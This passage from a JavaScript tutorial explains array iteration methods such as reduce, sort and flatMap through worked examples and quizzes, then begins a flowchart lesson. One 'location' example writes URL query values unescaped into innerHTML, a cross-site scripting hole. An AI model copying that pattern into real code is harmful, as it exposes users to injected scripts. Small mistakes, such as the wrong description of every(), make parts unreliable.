**-1**.\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nconst cards = [\n  { num: '457892425', cash: 1100 },\n  { num: '457812840', cash: 3000 },\n  { num: '457855780', cash: 1200 },\n  { num: '457811714', cash: 5000 }\n]\n\ncards.findIndex(card => card.cash > 1500)  // 1\n~~~\n\nThe obvious advantage over the **~indexOf~** method is that you can work with arrays of elements that have a **reference data type**.\nIn this example, the array elements are objects, and the **~indexOf~** method is not applicable to this array.\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nconst functions = [\n  message => message + '$$$',\n  () => Math.random() > 0.5 ? 'success' : 'failure',\n  arg => typeof arg === 'function' ? arg() : arg\n]\n\nconst sample = () => Math.random() > 0.5 ? 'success' : 'failure'\n\nfunctions.findIndex(func => func.toString() === sample.toString())\n~~~\n\n_______________________\n\n## ![ico-25 icon] every()\n\nChecks the array for elements that **not** satisfy the specified condition.\n\nReturns a boolean value:\n  • **~true~** if all elements of the array successfully passed the test.\n  • **~false~** if at least one element did not pass the test.\n\nThe **function-argument** checks whether the specified condition is met for each array element and returns a Boolean value.\n\nThe array is iterated until the function returns **~false~**.\nIn this case, the method will return **~false~**.\n\nIf the function returns **~true~** for all elements of the array, the method will return **~true~**.\n\n◘◘![ico-25 cap] **every**◘◘\n\n~~~js\nconst people = [\n  { name: 'Mykola Vasilenko', country: 'Ukraine' },\n  { name: 'Duke Shane', country: 'USA' },\n  { name: 'Demid Schweik', country: 'France' },\n  { name: 'Semyon Kartko', country: 'Ukraine' },\n  { name: 'Margaret Johnson', country: 'USA' },\n  { name: 'Pilip Danko', country: 'Ukraine' },\n  { name: 'Robert Trump', country: 'USA' },\n]\n\nconst res = people.every(x => x.country === 'Ukraine')\n\nconsole.log(res)\n~~~\n\n^^In this example, the array **people** is checked to see if it contains residents of **not** Ukraine.^^\n^^The variable **res** will have the value **~false~** because the array contains elements that do not satisfy the specified condition.^^\n\n______________________________________________\n\n## ![ico-25 icon] some()\n\nChecks the array to see if it contains elements that satisfy a given condition.\n\nReturns a boolean value (found/not found).\n\n**Argument function** checks whether the specified condition is met for each array element and returns a Boolean value.\n\nThe array is iterated until the function returns **~true~**.\nIn this case, the method will return **~true~**.\n\nIf the function returns **~false~** for all elements of the array, the method will return **~false~**.\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nconst people = [\n  { name: 'Mykola Vasilenko', country: 'Ukraine' },\n  { name: 'Duke Shane', country: 'USA' },\n  { name: 'Demid Schweik', country: 'France' },\n  { name: 'Semyon Kartko', country: 'Ukraine' },\n  { name: 'Margaret Johnson', country: 'USA' },\n  { name: 'Pilip Danko', country: 'Ukraine' },\n  { name: 'Robert Trump', country: 'USA' },\n]\n\nconst res = people.some(x => x.country === 'Pakistan')\n\nconsole.log(res)\n~~~\n\n^^This example checks the **people** array to see if it contains people from Pakistan.^^\n^^The variable **res** will have the value **~false~**, since there are no such “characters” in the array.^^\n\n^^The **~some~** method can be replaced with the following code:^^\n\n~~~js\nconst res = people\n  .map(human => human.country)\n  .includes('Pakistan')\n~~~\nor like this:\n~~~js\npeople\n  .filter(x => x.country === 'Pakistan')\n  .length > 0\n~~~\n\n____________________________\n\n## ![ico-25 icon] reduce()\n\nThis method differs from its \"colleagues\" in the list of formal parameters of **function-argument**.\nSpecifically, the first formal parameter of the **function-argument** will now not be the current array element, but the **accumulator variable**.\nThe value of this variable will be the result of the method.\n\nThe flexibility and versatility of this method lies in the fact that the result of its work can be anything: a number, an array, an object, a string, a Boolean value, etc.\nThis result is \"accumulated\" in the **accumulator variable**.\n\nLike all array iterating methods already discussed, the **~reduce~** method takes a function as its first required argument.\nHowever, the method's second argument is not a reference to the calling context of the **function-argument**.\nIt has a completely different purpose: it sets the starting value of the **accumulator variable**.\n\n![ico-20 warn] **If the starting value of the accumulator variable is not set, then the value of the first element of the array will be used as the starting value of the accumulator variable.**.\n\n^^Those if we do not pass a second argument to the method, it will set the starting value of the **accumulator variable** to the value of the first element of the iterable array.^^\n\n\n![ico-25 cap] Let's look at a simple example:\n\n~~~js\n[1, 2, 3, 4, 5].reduce(accumulator => accumulator * 2) // 16\n~~~\n\nSince the starting value of the **accumulator variable** is not specified, it will be equal to the value of the first element of the array, i.e. ** 1**.\nThe loop will loop until the last element of the array, but the elements themselves are not used by the **function-argument**:\n\n~~~js\naccumulator => accumulator * 2\n~~~\n\nTherefore, at each iteration, the value of the **accumulator variable** will simply double:\n\n•• 1 * 2 * 2 * 2 * 2 = 16 ••\n\n_____________________________________\n\n![ico-25 cap] Now let’s invite to this party the second formal parameter of the **function-argument**:\n\n~~~js\n[1, 2, 3, 4, 5].reduce((accumulator, item) => accumulator * item) // 120\n~~~\n\nThe starting value of **accumulator variable** will be 1 ^^(the value of the first element of the array)^^, but at each iteration the **accumulator variable** will be multiply by the value of the current array element:\n\n•• 1 * 2 * 3 * 4 * 5 = 120 ••\n\n____________________________\n\n![ico-25 cap] It's time to introduce the starting value of the **accumulator variable** into the battle:\n\n~~~js\n[1, 2, 3, 4, 5].reduce((accumulator, item) => accumulator * item, 5) // 600\n~~~\n\n•• 5 * 1 * 2 * 3 * 4 * 5 = 600 ••\n\nThis wonderful machine is now at our disposal.\n\n_________________________________\n\n![ico-25 cap] Let's dig deeper. Let's use the third formal parameter of **function-argument**:\n\n~~~js\n[10, 2, 3, 4, 5].reduce((accumulator, item, index) => accumulator * item + index) // 1319\n~~~\n\nHere, the **~reduce~** method performs the following sequence of calculations:\n\n•• ((((10 + 0) * 2 + 1) * 3 + 2) * 4 + 3) * 5 + 4 = 1319 ••\n\n_________________________________________\n\nSo far we've looked at an array of numbers and the numeric value of the **accumulator variable**.\n\nHowever, the potential of this method is much greater, and its capabilities are much wider.\n\n### ![ico-20 icon] Examples with the reduce() method\n\nLet's reduce an array of strings to an object.\nTo do this, we definitely need to specify the starting value of the **accumulator variable**, since the value of the first element of the array will be a string, and we want to get an object.\n\n\n◘◘![ico-20 cap] ** 1**◘◘\n\n~~~js\n['plus', 'minus', 'divide', 'multiply']\n  .reduce((res, item) => Object.assign(res, { [item]: item.length }), {})\n~~~\n\n~~~console\n▼ {plus: 4, minus: 5, divide: 6, multiply: 8}\n  divide: 6\n  minus: 5\n  multiply: 8\n  plus: 4\n  ► [[Prototype]]: Object\n~~~\n\n___________________\n\nNow let's reduce the array of objects to a string.\n\n◘◘![ico-20 cap] ** 2**◘◘\n\n~~~js\nconst string = [\n  { name: 'Piter', age: 31 },\n  { name: 'Helen', age: 29 },\n  { name: 'Robert', age: 45 },\n  { name: 'Andrew', age: 24 }\n].reduce((res, user) => res += `${user.name}: ${user.age}\\n`, 'Users:\\n')\n\nconsole.log(string)\n~~~\n\n~~~console\nUsers:\nPiter: 31\nHelen: 29\nRobert: 45\nAndrew: 24\n~~~\n\n_____________________________________\n\nNow let's count how many times each character appears in the string and return an object:\n\n◘◘![ico-20 cap] ** 3**◘◘\n~~~js\nconst string = 'With the trust of thousands of partners from around the world, we are dedicated to contributing to the widespread adoption of cryptocurrencies.'\n\nstring\n  .split('')\n  .reduce((result, char) => Object.assign(result, {\n    [char]: (result[char] || 0) + 1\n  }), {})\n~~~\n\n{{{Array-iteration-methods-reduce-2.js}}}\n_____________________________________\n\nNow let's count how many residents of each country are on the list.\n\n◘◘![ico-20 cap] ** 4**◘◘\n\n~~~js\nconst people = [\n  { name: 'Alexandra Pugh', country: 'Ukraine' },\n  { name: 'Andrea McKay', country: 'USA' },\n  { name: 'Anthony Webster', country: 'United Kingdom' },\n  { name: 'Noemi Lynch', country: 'Ukraine' },\n  { name: 'Enrique Michael', country: 'France' },\n  { name: 'Collin Roy', country: 'USA' },\n  { name: 'Stella Dillon', country: 'United Kingdom' },\n  { name: 'Lyra Bryant', country: 'France' },\n  { name: 'Shane Dodson', country: 'Ukraine' },\n  { name: 'Dream Douglas', country: 'USA' },\n  { name: 'Bobby Richards', country: 'USA' },\n  { name: 'Carmelo Atkinson', country: 'United Kingdom' }\n]\n\nconst result = people\n  .reduce((result, human) => Object.assign(result, {\n    [human.country]: (result[human.country] || 0) + 1\n  }), {})\n~~~\n\n{{{Array-iteration-methods-reduce-1.js}}}\n\n__________________________________________\n\n◘◘![ico-20 cap] ** 5**◘◘\n\n~~~js\n[5, 4, 3, 1, 10, 5, 9, 2, 1, 4]\n  .reduce((res, number, index, arr) => res += parseInt(number / Math.pow(10, index)), 0)\n~~~\n\nThe engine uses the exponential form of representing small numbers, i.e. instead of **~0.0000005~** there will be **~5e-7~**.\nFor large numbers the same thing happens, i.e. instead of **~5000000000000000000000~** there will be **~5e+21~**.\n\nFrom here:\n\n~~~js\nparseInt(5e-7) // 5\n\nparseInt(5e+21) // 5\n\nparseInt(0.0000005) // 5\n\nparseInt(5000000000000000000000) // 5\n~~~\n\n{{{Array-iteration-methods-reduce-3.js}}}\n\n_________________________________________\n\n\n◘◘![ico-20 cap] ** 6**◘◘\n\n~~~js\n[5, 4, 3, 1, 10, 5, 9, 2, 1, 4]\n  .reduce((res, number, index, arr) => res.concat(number / Math.pow(10, index)), [])\n~~~\n\n{{{Array-iteration-methods-reduce-4.js}}}\n\n_____________________________________\n\nAs in the case of other iterating methods, the **function-argument** is it can take additional arguments - the index of the current array element and a link to the original array itself.\nWith a reference, we can manipulate the original array, making it mutable.\n\n◘◘![ico-20 cap] ** 7**◘◘\n\n~~~js\nconst array = ['first', 'second', 'third', 'fourth']\n\narray.reduce((res, item, index, arr) => {\n  const order = Math.round(Math.random() * (arr.length - 1))\n  res.push(arr.splice(order, 1)[0])\n  return res\n}, array)\n~~~\n\n{{{Array-iteration-methods-reduce-5.js}}}\n\n_____________________________________\n\n### Math.sqrt\n\nLet's see how the **~reduce~** method will work if we pass it **~Math.sqrt~** as the first argument.\nThe library function **~Math.sqrt~** takes only 1 argument (a number), and returns the square root of the received argument.\nIf we do not pass a second argument to the **~reduce~** method when calling, it will use the value of the first element of the array as the starting value of the **accumulator variable**.\nAt each iteration, this value will be replaced by its square root.\nThe remaining elements of the array will not participate in the calculations, since **~Math.sqrt~** takes only 1 argument, and this will be the current value of the **accumulator variable**.\n\n◘◘![ico-20 cap] ** 8**◘◘\n\n~~~js\n;[625, 5, 10].reduce(Math.sqrt) // 5\n~~~\n\n^^In this example, the square root of 625 was taken twice:^^\n••625 -> 25 -> 5••\n\n^^Why twice? Because there are 3 elements in the array, but the first element became the starting value of the **accumulator variable**.^^\n\n^^If we add this method **~root~** to the prototype of the **~Array~** constructor, then the result of its call will be the same:^^\n\n~~~js\nArray.prototype.root = function () {\n  return Math.pow(this[0], Math.pow(0.5, this.length - 1))\n}\n\n;[625, 0, 0].root() // 5\n~~~\n____________________________________________\n\n◘◘![ico-20 cap] ** 9**◘◘\n\n~~~js\n[0, 0, 0].reduce(Math.sqrt, 625 * 625) // 5\n~~~\n\n^^In this example, we set the starting value of **accumulator variable** (625 * 625) as the second argument of the **~reduce~** method.^^\n^^Therefore, the number of iterations (that is, how many times the square root of the **accumulator variable** will be extracted) will be equal to the number of array elements.^^\n\n{{{Array-iteration-methods-reduce-7.js}}}\n\n_______________________________\n\n### Math.pow\n\nNow we will pass the library function **Math.pow** (exponentiation) to the **~reduce~** method as the first argument.\nThis function takes two numeric arguments: the number to be raised to the power and the value of the power.\n\nIf we do not pass the starting value of the **accumulator variable** as the second argument of the **~reduce~** method, then the value of the first element of the array will be used as this value.\nThe remaining elements of the array will be the values ​​of the power to which the current value of the **accumulator variable** needs to be raised.\n\nIf we pass the starting value of the **accumulator variable**, then all elements of the array will be considered as the power to which we need to raise the current value of the **accumulator variable**.\n\n◘◘![ico-20 cap] ** 10**◘◘\n\n~~~js\nconsole.log([3, 2, 2].reduce(Math.pow))    // 81\n\nconsole.log(Math.pow(Math.pow(3, 2), 2))   // 81\n\nconsole.log([2, 3, 3].reduce(Math.pow))    // 512\n\nconsole.log(Math.pow(Math.pow(2, 3), 3))   // 512\n\nconsole.log([2, 2, 2].reduce(Math.pow, 2)) // 256\n\nMath.pow(Math.pow(Math.pow(2, 2), 2), 2)   // 256\n~~~\n\n{{{Array-iteration-methods-reduce-10.js}}}\n\nIf we add a **~pow~** method to the prototype of the **~Array~** constructor, then this method will work similarly to the **~reduce~** method called with the library function **~Math.pow~** and without the second argument:\n\n~~~js\nArray.prototype.pow = function () {\n  let res = this[0]\n  for (const item of this.slice(1)) {\n    res = Math.pow(res, item)\n  }\n  return res\n}\n\n[3, 2, 2].pow() // 81\n~~~\n\n______________________________________\n\n### ![ico-25 hw] Tests\n\nWhat will the following expressions return:\n\n◘◘** 1**◘◘\n\n→→→ [].reduce(Math.pow) | TypeError, null, NaN, 0 | TypeError →→→\n\n◘◘** 2**◘◘\n\n→→→ [].reduce(Math.sqrt, 'Google') | TypeError, null, NaN, 0, 'Google' | Google →→→\n\n◘◘** 3**◘◘\n\n→→→ [1].reduce(Math.sqrt, 'Google') | TypeError, null, NaN, 0, 'Google' | NaN →→→\n\n◘◘** 4**◘◘\n\n→→→ [-10, -20, 5].reduce(Math.abs) | null, NaN, 0, 10, 20, 5 | 10 →→→\n\n◘◘** 5**◘◘\n\n→→→ [.5].reduce(Math.pow, 49) | null, NaN, 0, 7, 49, 5 | 7 →→→\n\n_________________________________\n\n## ![ico-25 icon] sort()\n\nThe number of iterations will obviously be greater than the number of array elements.\n\nThe method sorts the array according to the specified sorting condition.\nThe sorting condition is checked by the **argument function** passed to the method.\n_The **argument function** has two formal parameters whose values ​​are used for comparison._.\n\nThe function returns one of three values:\n\n|  0 | elements coincided (equal)            |\n|  1 | first argument is greater than second |\n| -1 | second argument is greater than first |\n\nBased on the value returned by the function, the method changes the order of the elements in the array.\n\n◘◘![ico-20 cap] ** 1**◘◘\n\n~~~js\nvar sourceArray = [\n  { title: 'fond', value: 100 },\n  { title: 'salary', value: 400 },\n  { title: 'bonus', value: 70 },\n  { title: 'debt', value: 700 },\n  { title: 'credit', value: 200 },\n  { title: 'payments', value: 150 },\n  { title: 'income', value: 320 },\n]\nvar resArray = sourceArray.sort(function (x, y) {\n  return x.value - y.value\n})\n~~~\n\n◘◘**Result**◘◘\n\n~~~console\n▼ (7) [{…}, {…}, {…}, {…}, {…}, {…}, {…}]\n  ► 0: {title: \"bonus\", value: 70}\n  ► 1: {title: \"fond\", value: 100}\n  ► 2: {title: \"payments\", value: 150}\n  ► 3: {title: \"credit\", value: 200}\n  ► 4: {title: \"income\", value: 320}\n  ► 5: {title: \"salary\", value: 400}\n  ► 6: {title: \"debt\", value: 700}\n    length: 7\n  ► __proto__: Array(0)\n~~~\n\n^^Для понимания механизма сортировки выведем в консоль значения сравниваемых элементов массива на каждой итерации:^^\n^^To understand the sorting mechanism, let’s display the values ​​of the array elements being compared at each iteration to the console:^^\n\n◘◘![ico-20 cap] ** 2**◘◘\n~~~js\nvar resArray = sourceArray\n  .sort(function (x, y) {\n    console.log(`${x.title} - ${y.title} = ${x.value - y.value}`)\n    return  x.value - y.value\n  })\n~~~\n\n◘◘**Result**◘◘\n\n~~~console\nfond - bonus = 30\npayments - fond = 50\ncredit - payments = 50\nincome - credit = 120\nsalary - income = 80\ndebt - salary = 300\n~~~\n\n^^^[Logging]\n^^Let's create a **log** array, in which we will log all operations in the process of sorting the array.^^\n~~~js\nvar log = []\nvar resArray = sourceArray\n  .sort(function (x, y) {\n    log.push({\n      id: x.title + \" > \" + y.title,\n      res: x.value > y.value\n    })\n    return  x.value - y.value\n  })\n~~~\n**log**\n~~~console\n▼ (13) [...]\n  ► 0: {id: 'salary > fond', res: true}\n  ► 1: {id: 'bonus > salary', res: false}\n  ► 2: {id: 'bonus > salary', res: false}\n  ► 3: {id: 'bonus > fond', res: false}\n  ► 4: {id: 'debt > fond', res: true}\n  ► 5: {id: 'debt > salary', res: true}\n  ► 6: {id: 'credit > salary', res: false}\n  ► 7: {id: 'credit > fond', res: true}\n  ► 8: {id: 'payments > credit', res: false}\n  ► 9: {id: 'payments > fond', res: true}\n  ► 10: {id: 'income > credit', res: true}\n  ► 11: {id: 'income > debt', res: false}\n  ► 12: {id: 'income > salary', res: false}\n    length: 13\n  ► __proto__: Array(0)\n~~~\n^^^\n\nSo, unlike other array iterating methods, the **function-argument** has strictly two formal parameters.\n\n![ico-20 warn] This method cannot be passed a reference to the call context.\n\n![ico-25 require] Try to draw a block diagram of the algorithm for sorting an array.\n\n__________________________\n\n## ![ico-25 icon] flatMap()\n\nThere is a line **cookie**:\n\n◘◘![ico-20 cap] ** 1**◘◘\n\n~~~js\nvar cookie = 'name=user; token=Jd7-js15/84; interest=javascript'\n~~~\n\nLet's split the string **cookie** and apply the **~map~** method to the resulting array.\n\n~~~js\ncookie.split('; ').map(item => item.split('=')\n~~~\n\n◘◘**^^Result^^**◘◘\n\n~~~console\n▼ (3) [Array(2), Array(2), Array(2)]\n  ► 0: (2) [\"name\", \"user\"]\n  ► 1: (2) [\"token\", \"Jd7-js15/84\"]\n  ► 2: (2) [\"interest\", \"javascript\"]\n    length: 3\n  ► __proto__: Array(0)\n~~~\n\nWe have received an array whose elements are arrays.\n\nNow apply the **~flatMap~** method to the array:\n\n~~~js\nconsole.log(cookie.split('; ').flatMap(item => item.split('='))\n~~~\n\n◘◘**^^Result^^**◘◘\n\n~~~console\n► (6) [\"name\", \"user\", \"token\", \"Jd7-js15/84\", \"interest\", \"javascript\"]\n~~~\n\nWe got a \"flat\" array.\n\nSo, using the same function:\n\n~~~js\nfunction (item) {\n  return item.split('=')\n}\n~~~\n\nin the first case we received an array of arrays, and in the second we received a “flat” array.\n\n____________________________________________________\n\n## ![ico-25 icon] keys()\n\n**Generator**.\n**Returns a _iterator_ object.**.\n\n◘◘![ico-20 cap] **keys**◘◘\n\n~~~js\nconst cookie = 'name=user; token=Jd7-js15/84; interest=javascript'\n  .split('; ')\n  .map(item => item.split('='))\n\nconst iterator = cookie.keys()\n\ndo {\n  var { value, done } = iterator.next()\n  done || console.log(cookie[value][0], cookie[value][1])\n} while (!done)\n~~~\n\n◘◘**^^Result^^**◘◘\n\n~~~console\nname user\ntoken Jd7-js15/84\ninterest javascript\n~~~\n\n\n______________________\n\n## ![ico-25 icon] values()\n\n**Generator**.\n**Returns a _iterator_ object.**.\n\n◘◘![ico-20 cap] **values**◘◘\n\n~~~js\nconst cookie = 'name=user; token=Jd7-js15/84; interest=javascript'\n\nconst iterator = cookie\n  .split ('; ')\n  .map(item => item.split('='))\n  .values()\n\ndo {\n  var { value, done } = iterator.next()\n  done || console.log(value)\n} while (!done)\n~~~\n\n◘◘**^^Result^^**◘◘\n\n~~~console\n► (2) [\"name\", \"user\"]\n► (2) [\"token\", \"Jd7-js15/84\"]\n► (2) [\"inerest\", \"javascript\"]\n~~~\n\n_____________________________________________\n\n## ![ico-30 icon] Examples and tests\n\n_________________________________________\n\n### ![ico-25 cap] Cache amount on cards\n\nLet´s create an array of bank cards and use the **~reduce~** method to calculate the amount of funds on all cards:\n\n~~~js\nconst cards = [\n  { num: '457892425', cash: 1100 },\n  { num: '457812840', cash: 3000 },\n  { num: '457855780', cash: 1200 },\n  { num: '457811714', cash: 5000 }\n]\n\ncards.reduce((result, card) => result + card.cash, 0)  // 10300\n~~~\n\n___________________________________________________\n\nLet´s create a new card on which we accumulate the account balances of all cards:\n\n~~~js\ncards.reduce((result, card) => ({\n  num: result.num,\n  cash: result.cash + card.cash\n}), { num: '457855155', cash: 0 })\n~~~\n\n◘◘**^^Result^^**◘◘\n\n~~~console\n▼ { num: \"457855155\", cash: 10300 }\n    cash: 10300\n    num: \"457855155\"\n  ► __proto__: Object\n~~~\n\nFor the purity of the result, we will additionally reset the balances on the accounts of other cards:\n\n~~~js\ncards.reduce((result, card) => {\n  const cash = card.cash\n  card.cash = 0\n  return {\n    num: result.num,\n    cash: result.cash + cash\n  }\n}, { num: '457855155', cash: 0 })\n~~~\n\nNow the original map array will be:\n\n~~~console\n\n▼ (4) [{…}, {…}, {…}, {…}]\n  ► 0: {num: \"457892425\", cash: 0}\n  ► 1: {num: \"457812840\", cash: 0}\n  ► 2: {num: \"457855780\", cash: 0}\n  ► 3: {num: \"457811714\", cash: 0}\n    length: 4\n  ► __proto__: Array(0)\n\n~~~\n\n__________________________________________\n\n### ![ico-25 cap] Clearing duplicates\n\nLet´s assume that we have an array of users, and we decide to get an array of all the specialties that these users have.\n~~~js\nconst users = [\n  { name: 'Watson Armstrong', speciality: 'developer' },\n  { name: 'Marcelo Anthony', speciality: 'doctor' },\n  { name: 'Eva Randall', speciality: 'teacher' },\n  { name: 'Stephen Meyer', speciality: 'worker' },\n  { name: 'Isabella Drake', speciality: 'teacher' },\n  { name: 'Rafael Gilbert', speciality: 'developer' },\n  { name: 'Adrianna Schultz', speciality: 'doctor' },\n  { name: 'Kira Hall', speciality: 'teacher' },\n  { name: 'Carmen Duarte', speciality: 'musician' },\n  { name: 'Anika Burton', speciality: 'developer' },\n  { name: 'Hugo Gray', speciality: 'worker' },\n  { name: 'Scott Hahn', speciality: 'worker' }\n]\n\nconst specialities = users.map(user => user.speciality)\n~~~\n\nHowever, as we see, many specialties will be duplicated, which we absolutely do not need.\n\n◘◘**^^specialities^^**◘◘\n~~~console\n▼ [...]\n   0: \"developer\"\n   1: \"doctor\"\n   2: \"teacher\"\n   3: \"worker\"\n   4: \"teacher\"\n   5: \"developer\"\n   6: \"doctor\"\n   7: \"teacher\"\n   8: \"musician\"\n   9: \"developer\"\n  10: \"worker\"\n  11: \"worker\"\n  length: 12\n  ► [[Prototype]]: Array(0)\n~~~\n\nWe need to remove duplicate elements of the **~specialities~** array.\n\n![ico-20 warn] Let´s immediately note that the easiest way to achieve this is using the **~Set~** constructor:\n\n~~~js\nArray.from(new Set(specialities))\n~~~\n\nBut we decided to take a more difficult path ![ico-25 wink].\n\n~~~js\nconst arr = [\n  'google',\n  'mozilla',\n  'ie',\n  'mozilla',\n  'mozilla',\n  'google',\n  'mozilla',\n  'ie',\n  'ie',\n  'google'\n]\n~~~\n\n~~~js\narr.reduce((result, item) => {\n  result.indexOf(item) < 0 ? result.push(item) : null\n  return result\n}, [])\n~~~\n\n◘◘**^^Result^^**◘◘\n\n~~~console\n▼ (3) [\"google\", \"mozilla\", \"ie\"]\n    0: \"google\"\n    1: \"mozilla\"\n    2: \"ie\"\n    length: 3\n  ► __proto__: Array(0)\n~~~\n\n_________________________________________________\n\n### ![ico-25 cap] Number of nested segments\n\nThere are several segments on the number axis:\n\n~~~js\nconst intervals = [[10, 20], [4, 18], [7, 10], [5, 16], [9, 13], [11, 15], [7, 15], [10, 12], [12, 19]]\n~~~\n\nFor each segment, you need to count how many segments are inside it.\n\nTo simplify the code, add the **~testSegment~** method to the prototype of the **~Array~** constructor:\n\n~~~js\nArray.prototype.interior = function (interval = [0, 1]) {\n  return this[0] < interval[0] && this[1] > interval[1]\n}\n~~~\nNow you can compare two segments very simply:\n~~~js\n[18, 35].interior([4, 18]) // false\n[18, 35].interior([20, 28]) // true\n~~~\nNow we can complete the task:\n~~~js\nintervals\n  .map((segment, index, array) => array.filter(interval => segment.interior(interval)).length)\n~~~\n\n◘◘**^^Result^^**◘◘\n~~~console\n► (9) [2, 6, 0, 5, 1, 0, 2, 0, 0]\n~~~\n\n__________________________\n\n### ![ico-25 cap] Brackets validation\n\nThe task: check pairing and correct placement of brackets.\n\nFor example, the validation of string ~({})[([])]~ should return ~true~,\nand the string validation ~({(})[([)])]~ should return ~false~.\n\nFor ease of use, let´s create an inherited string method:\n\n~~~js\nString.prototype.testBrackets = (function () {\n  const brackets = {\n    '[': ']',\n    '{': '}',\n    '(': ')'\n  }\n\n  const all = ['[', '{', '(', ']', '}', ')']\n\n  return function () {\n    const self = this\n      .split('')\n      .filter(char => all.includes(char))\n\n    let stack = [], result = ''\n\n    self\n      .forEach(symbol => {\n        if (!brackets[symbol] && stack.length === 0) return false\n\n        brackets[symbol] ? stack.push(symbol) : symbol = brackets[stack.pop()]\n\n        result += symbol\n      })\n\n    return result === self.join('') && stack.length === 0\n  }\n})()\n~~~\n\n~~~js\n'( [ ( { ( ( {(} ([]) ) ) } ) ] )'.testBrackets()   // false\n\nString.prototype.testBrackets.toString().testBrackets()  // true\n~~~\n\n{{{Array-iteration-methods-brackets.js}}}\n___________________________________________________\n\n### ![ico-25 cap] location\n\n~~~js\nfunction getSearchObject () {\n  const obj = {}\n\n  location.search\n    .slice(1)\n    .split(',')\n    .map(x => x.split('='))\n    .map(function (item) { this[item[0]] = item[1] }, obj)\n\n    return obj\n}\n\nvar searchObject = getSearchObject ()\nfor (const rec in searchObject) {\n  document.body.innerHTML += `<p>${rec}: ${searchObject[rec]}</p>`\n}\n~~~\n\n[:::**Live demo**:::](samples/11)\n\n_____________________________________________\n\n### ![ico-25 cap] getComputedStyle\n\nFollow [**_link_**](https://en.wikipedia.org/wiki/Idempotence ) and in the page console run the code:\n\n~~~js\nArray.from(document.getElementsByClassName('interlanguage-link'))\n  .map(item => getComputedStyle(item))\n  .forEach(item => console.log(item['font-family']))\n~~~\n\n________________________________________________\n\n[![ico-30 hw] **Тесты**](quiz/arrayIterationMethods)\n"},54326:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 icon] Algorithm flowchart\n\n______________________________________________________________________\n\n## ![ico-25 icon] Algorithm\n\nStructural programming is based on the triad:\n\n- **Sequence** - execution of actions one after another.\n- **Branching** - selection of an action depending on the fulfilment of a condition.\n- **Cycle** - multiple repetition of the same sequence of actions.\n\nProgramming begins with _description of an algorithm_.\n\n**Algorithm** is a step-by-step system of instructions defining the process of transition from the initial data (input) to the desired result (output).\n\n| **~Input~** | ** ➔** | **~Process~** | ** ➔** | **~Output~** |\n\nIf the output result exists, the algorithm is executed in a finite number of steps.\n\nIf the desired result does not exist, the algorithm either never completes or reaches a dead end.\n\nSometimes the algorithm is simple enough that you keep it in mind when you write a script.\n\nBut sometimes it\'s so complex that you want to have a visualisation it so you don\'t forget or confuse anything.\n\nOne way to describe an algorithm is a **flowchart**.\n\n\n________________________________________________________________________________\n\n## ![ico-25 icon] Flowchart\n\nFlowcharts are indispensable tools for visualising complex processes.\n\nIn order to depict a process schematically, we need certain graphical forms.\n\nThe simplest of such forms are:\n\n@@@@ 1\n![](illustrations/flowchart-symbols.svg)\n@@@@\n\nThe algorithm must have the beginning and the end.\n\nTransition from one action to another is represented by arrows.\n\nThe block of operations (a rectangle) allows you to use different level of detail. A whole sequence of simple actions can be written into one such block, or each such simple action can be placed in a separate block.\n\n<div class="flowchart-endpoints">Begin<div>\n<div class="flowchart-arrow">↓</div>\n<div class="flowchart-process">Get your trousers<div>\n<div class="flowchart-arrow">↓</div>\n<div class="flowchart-process">Clean your trousers<div>\n<div class="flowchart-arrow">↓</div>\n<div class="flowchart-process">Sew on a button<div>\n<div class="flowchart-arrow">↓</div>\n<div class="flowchart-process">Iron the trousers<div>\n<div class="flowchart-arrow">↓</div>\n<div class="flowchart-process">Put the trousers on<div>\n<div class="flowchart-arrow">↓</div>\n<div class="flowchart-endpoints">End<div>\n\n_______________________________________________________\n\nEach of the ‘Clean trousers’ or ‘Sew on a button’ blocks can be expanded into a separate sequence of actions.\n\nYou can rearrange the ‘Clean trousers’ and ‘Sew on a button’ blocks, but you should definitely not rearrange the ‘Put on trousers’ block, as this will make all other operations much more complicated.\n\n_______________________________________________________\n\n^^To draw a flowchart, you can use^^ [^^**free service**^^ ![ico-25 draw-io]](https://www.draw.io/)\n\n_______________________________________________________\n\n### ![ico-20 icon] Sequence\n\nYou may not realise it, but your whole life is a process that consists of a certain sequence of actions.\n\nYou get up in the morning, then go to the bathroom, then (most likely) to the kitchen where you make your coffee, etc.\n\nBefore going to work, you get dressed.\n\nIt would probably be weird if you went outside straight from the shower. Although stuff happens ![ico-25 wink].\n\nI.e. if you remove some link in your sequence of actions, or rearrange two separate operations, the result can be very unpleasant.\n\nSuppose you make yourself tea, drink it, and only then put sugar in your cup. My guess is that you have been drinking unsweetened tea. Adding sugar after tea drinking is obviously not going to fix the situation.\n\nSo, consistency is very important.\n\nWhen you write a programme, you give the computer a clear sequence of actions.\n\nThis sequence can be represented schematically in the form of a flowchart:\n\n\n@@@@ 1\n![](illustrations/flowchart-sequence.svg)\n@@@@\n\nAs you can see, the direction from top to bottom is strictly observed.\nOnly after the previous action is completed does the next one begin.\n\n_______________________________________________________\n\n### ![ico-20 icon] Branching\n\nVery often we are forced to make a decision about what to do.\nIf your salary is delayed, you cannot make a planned purchase.\nGetting your salary is a condition, if it is fulfilled - you can buy what you planned.\n\nYour code will operate on data that changes dynamically.\nDepending on the value of some data, your code will perform different operations.\nFor example, a user opened your application.\nHe may have registered, logged in or logged in as an unregistered user.\nIf he is a registered user, he can log in to his personal account.\nOtherwise, he can\'t.\n\n@@@@ 1\n![](illustrations/flowchart-branching.svg)\n@@@@\n\n_______________________________________________________\n\n### ![ico-20 icon] Cycle\n\nRepeating the same sequence of actions several times is a cycle.\n\nWashing dishes by hand is a cycle (plate after plate, cup after cup - until all the dishes are washed).\n\nWalking is a cycle: you lift your left leg, carry it forward, lower it, you shift your body weight to the left leg and lift the right leg, which is also carried forward and lowered, and so on until you reach the destination point or you get bored with these exercises.\n\nIn a flowchart of the algorithm, the cycle would look something like this:\n\n@@@@ 1\n![](illustrations/flowchart-circle.svg)\n@@@@\n\nAs you can see, there is some condition whose fulfilment is checked at each **iteration** of the loop.\nI.e. if we didn\'t use the **branching** above, the loop would loop infinitely, which is absolutely inadmissible.\n\n_______________________________________________________\n\n\n![ico-20 hw] **Exercise 1**\n\n^^Draw a flowchart of the algorithm for summing all integers from 1 to N.^^\n\n![ico-20 hw] **Exercise 2**\n\n^^raw a flowchart of the algorithm for summing all odd integers from 1 to 